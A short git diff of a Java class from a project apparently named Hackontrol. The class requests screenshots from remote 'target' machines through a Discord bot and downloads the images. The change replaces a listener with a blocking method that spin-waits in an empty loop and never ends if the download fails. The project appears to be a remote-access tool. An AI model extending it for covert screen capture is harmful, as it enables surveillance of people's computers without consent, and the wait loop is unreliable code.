@@ -5,8 +5,6 @@ import java.io.InputStream;
 
 import javax.imageio.ImageIO;
 
-import com.khopan.hackontrol.target.ScreenshotListener;
-
 import net.dv8tion.jda.api.entities.Message.Attachment;
 
 public class Target {
@@ -15,7 +13,7 @@ public class Target {
 
 	boolean connected;
 
-	private ScreenshotListener screenshotListener;
+	private volatile BufferedImage image;
 
 	public Target(Hackontrol hackontrol, MachineId identifier) {
 		this.hackontrol = hackontrol;
@@ -27,17 +25,12 @@ public class Target {
 		return this.identifier;
 	}
 
-	public ScreenshotListener getScreenshotListener() {
-		return this.screenshotListener;
-	}
-
-	public void setScreenshotListener(ScreenshotListener listener) {
-		this.screenshotListener = listener;
-	}
-
-	public void screenshot() {
+	public BufferedImage screenshot() {
 		this.check();
+		this.image = null;
 		this.hackontrol.request.screenshot();
+		while(this.image == null) {}
+		return this.image;
 	}
 
 	void screenshotTaken(Attachment attachment) {
@@ -48,12 +41,11 @@ public class Target {
 				InputStream stream = attachment.getProxy().download().get();
 				image = ImageIO.read(stream);
 			} catch(Throwable ignored) {
+				ignored.printStackTrace();
 				return;
 			}
 
-			if(this.screenshotListener != null) {
-				this.screenshotListener.screenshotTaken(image);
-			}
+			this.image = image;
 		}).start();
 	}
 
